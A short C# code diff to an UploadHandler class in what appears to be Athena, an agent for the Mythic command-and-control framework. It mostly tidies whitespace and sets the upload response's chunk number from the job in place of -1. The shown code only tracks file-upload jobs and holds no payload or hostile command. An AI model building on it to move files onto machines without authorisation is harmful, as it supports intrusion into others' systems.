@@ -12,6 +12,7 @@ namespace Athena.Commands
     public class UploadHandler
     {
         private ConcurrentDictionary<string, MythicUploadJob> uploadJobs { get; set; }
+        
         public UploadHandler()
         {
             uploadJobs = new ConcurrentDictionary<string, MythicUploadJob>();
@@ -27,7 +28,6 @@ namespace Athena.Commands
             uploadJob.task = job.task;
             uploadJob.chunk_num = 1;
 
-
             this.uploadJobs.GetOrAdd(job.task.id,uploadJob);
 
             return new UploadResponse
@@ -36,19 +36,17 @@ namespace Athena.Commands
                 upload = new UploadResponseData
                 {
                     chunk_size = uploadJob.chunk_size,
-                    chunk_num = -1,
+                    chunk_num = uploadJob.chunk_num,
                     file_id = uploadJob.file_id,
                     full_path = uploadJob.path,
                 }
             };
-
         }
 
         public async Task<bool> ContainsJob(string task_id)
         {
             return uploadJobs.ContainsKey(task_id);
         }
-
 
         public async Task<MythicUploadJob> GetUploadJob(string task_id)
         {
